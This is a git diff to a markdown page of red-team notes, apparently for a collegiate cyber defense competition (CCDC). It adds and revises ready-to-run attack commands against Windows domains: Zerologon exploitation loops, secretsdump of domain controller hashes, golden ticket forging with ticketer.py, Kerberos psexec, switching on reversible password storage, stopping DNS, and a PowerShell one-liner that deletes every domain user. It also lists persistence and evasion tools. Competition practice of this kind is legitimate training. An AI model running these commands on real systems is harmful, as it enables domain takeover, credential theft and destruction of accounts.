@@ -13,6 +13,8 @@ pagetitle: Red Teaming for CCDC
     - `-min-hostgroup` will divide the range up into 96 sup parts
     - Instead of `-T4`, we can specify `--max-retries 2 --max-rtt-timeout {double_time_to_ping}ms --min-rate 300`
   - Then, check SMB IPs with `while read -r line; do nxc smb $line -u '' -p '' -M zerologon -M printnightmare -M smbghost -M ms17-010; done < smb_ips.txt` 
+    - [ZeroLogonShot](https://github.com/XiaoliChan/zerologon-Shot) will exploit and fix
+      - `for i in {1..10}; do python3 zerologon-Shot.py {DC_name} {DC_IP_with_$i}; done`
     - If we get a zerologon hit, run `zerologon.py` and then `impacket-secretsdump -just-dc -no-pass {domain}/{machine_name}:@{DC_IP}`
       - `for i in {1..10}; do python3 zerologon.py {DC_name} {DC_IP_with_$i}; done`
       - e.g. `impacket-secretsdump -just-dc -no-pass 'corp.local/TEST-DC$@10.10.0.162'` (if DC name is TEST-DC)
@@ -38,7 +40,7 @@ pagetitle: Red Teaming for CCDC
     - Downloads and executes Mimikatz's skeleton key module
     - Downloads sliver shell and creates a sliver service hidden with ACLs
   - Check out [RealBindingEDR](https://github.com/myzxcg/RealBlindingEDR)
-  - Investigate hiding services with ACLs: https://www.sans.org/blog/red-team-tactics-hiding-windows-services
+  - H services with ACLs: [https://www.sans.org/blog/red-team-tactics-hiding-windows-services](https://www.sans.org/blog/red-team-tactics-hiding-windows-services)
     - This seems extremely good
   - Pivoting with netsh port proxy
   - C2s
@@ -77,14 +79,14 @@ pagetitle: Red Teaming for CCDC
     - Modify the "SeDenyInteractiveLogonRight" line and remove the `Guest` account
     - Reimport with `secedit /configure /db C:\Windows\temp\secedit.sdb /cgf C:\Windows\temp\secpol.inf`
     - Then update GP with `gpupdate /force`
+- Save passwords in plaintext
+  - `Set-ADDefaultDomainPasswordPolicy -Identity "great.cretaceous" -ReversibleEncryptionEnabled $true`
 
 **Linux:**
 - [PANIX](https://github.com/Aegrah/PANIX)
   - One-stop shop for lots of persistence methods, this thing is a great reference
 - Todo:
-  - Look for log sources and make sure they're cleared
-    - Service logs, dmesg
-  - Add ssh key thing
+  - PAM caught via `debsums` or `dpkg --verify`
   - Get something going for alpine/Nixos
     - Alpine
       - Add a second location for SSH keys 
@@ -155,13 +157,12 @@ pagetitle: Red Teaming for CCDC
 - Requires full control over the DC or a being part of a Domain Admin group
 - Dump `krbtgt` NTLM hash with mimikatz (unless we already have it)
 	- `lsadump::lsa /patch`
-- After grabbing the hash, from any domain user:
-	- `kerberos::purge` to delete any existing tickets
-	- `kerberos::golden /user:{domain_user} /domain:{domain} /sid:{domain_SID} /krbtgt:{krbtgt_NTLM_hash} /ptt`
+- After grabbing the hash:
+  - `ticketer.py -duration 10 -aesKey "{aes_key}" -domain-sid "{domain_sid}" -domain "{domain_name}" "Administrator"`
 		- The `domain_SID` can be gathered from whoami /user
 - This will essentially give the domain user Domain Admin privileges
-	- `PsExec.exe \\{domain_controller_dnshostname} powershell`
-		- Can't use the IP of the DC, as that will resort to NTLM
+	- `impacket-psexec -k -no-pass Administrator@{DC_fqdn}`
+	- Make sure we can resolve both the domain AND the DC itself
 		
 **Shadow Copies**
 - Volume Shadow Service is a Microsoft backup technology that allows creation of snapshots
@@ -239,6 +240,8 @@ pagetitle: Red Teaming for CCDC
 - Set all computers to same background:
   - GPO management > right-click domain > Create GPO in domain and link here > Right click on new GPO + edit > User Configuration\Policies\Administrative Templates\Desktop\Desktop > desktop wallpaper > select `enabled` + enter path of image and select fill for style > apply + ok > `gpupdate /force`
 - `misc::wp /file:{path}` to set the current PC's wallpaper
+- `sc.exe stop dns` to stop dns
+- `powershell -c "Get-ADUser -Filter * | ForEach-Object { Remove-ADUser $_ -Confirm:$false }"` to delete domain users
 
 ## Dealing with System Protections
 
